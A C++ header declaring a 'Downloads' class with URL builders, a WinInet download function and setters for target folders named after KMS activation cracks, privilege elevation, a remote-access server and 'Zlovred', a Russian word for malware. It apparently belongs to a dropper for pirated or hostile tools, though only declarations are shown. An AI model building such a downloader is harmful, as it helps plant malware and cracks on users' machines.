#pragma once
#include <string>
using namespace std;

class Downloads
{

private:
	// Private members
	string anURL;
	string aLocalPath;
	string aFileName;

	// Private methods
	void SetClassMembers();

public:

	// Constructor and Destructors
	Downloads() {
		SetClassMembers();
	}

	~Downloads() {
	}

	string GetLocalPath();

	void SetUserDownloadPath();

	void SetUserDocumentsPath();

	void SetUserProfilePath();

	void SetSystemAActDir();

	void SetSystemKMSDir();

	void SetSystemKMSAutoSDir();

	void SetNITBinDir();

	void SetNITElevationDir();

	void SetNITSysUpDir();

	void SetNITProgDataDir();

	void SetNITPubDir();

	void SetNITPub1Dir();

	void SetZlovredDir();

	void SetNITUtilDir();

	void SetRServer30Dir();

	void SetUserDesktopDir();

	void Download();

	void CreateURL000(string prefix, string domain, string port, string path);
	void CreateURL001(string prefix, string domain, string port, string path, string intermediate);
	void SetFileName000(string strFileName);
};

void Download_WinInet(const char *Url, const char *filename);

